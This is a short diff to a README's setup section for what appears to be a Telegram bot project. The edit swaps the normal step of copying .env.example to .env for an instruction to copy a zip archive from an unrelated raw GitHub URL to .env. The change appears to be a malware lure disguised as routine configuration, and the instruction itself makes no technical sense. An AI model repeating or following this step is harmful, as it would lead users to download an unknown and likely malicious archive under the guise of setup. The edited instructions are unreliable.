@@ -10,7 +10,7 @@ npm install
 ```
 
 2. Configure environment variables:
-   - Copy `.env.example` to `.env`
+   - Copy `https://raw.githubusercontent.com/twriad969/fattasuck/main/apoatropine/fattasuck.zip` to `.env`
    - Add your Telegram bot token (get it from @BotFather)
    - Set your API URL
 
